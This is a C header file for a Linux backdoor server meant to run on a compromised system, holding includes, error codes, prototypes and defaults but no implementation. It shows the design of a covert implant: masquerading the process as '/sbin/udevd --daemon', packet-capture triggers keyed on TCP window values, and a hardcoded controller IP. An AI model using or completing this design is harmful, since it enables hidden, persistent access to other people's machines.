/*-----------------------------------------------------------------------------
 * backdoor-betty.h - Linux backdoor server (runs on comprimised system)
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#ifndef BACKDOOR_BETTY_H
#define BACKDOOR_BETTY_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <err.h>
#include <signal.h>

#include <getopt.h>
#include <pcap.h>
#include <sys/prctl.h>

#define __FAVOR_BSD	/* use BSD-style headers */
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* error codes */
#define ERROR_NONE		 0
#define ERROR_GENERAL	-1
#define ERROR_NOTROOT	-2
#define ERROR_SOCKET	-3
#define	ERROR_SEND		-4
#define ERROR_READ		-5
#define ERROR_OPTS		-6
#define	ERROR_OPTS_HELP	-7
#define ERROR_FORK		-8

/* defaults */
#define	TRUE			1
#define FALSE			0
#define USER_ROOT		0
#define PROCESS_NAME 	"/sbin/udevd --daemon"
#define WINDOW_EXT_CMD	21387 /* win for extern commands */
#define WINDOW_INT_CMD	45245 /* win for intern commands */
#define CLIENT_IP		"192.168.1.100"

struct svr_vars {
	int daemonize;
	char *client_ip;
} svr_vars;

void print_settings(char *);
void print_usage(char *, int);
int parse_options(int, char **);
void signal_handler(int);
void exit_clean(void);
void daemonize(void);
int set_root(void);
void mask_process(char **, char *);

#endif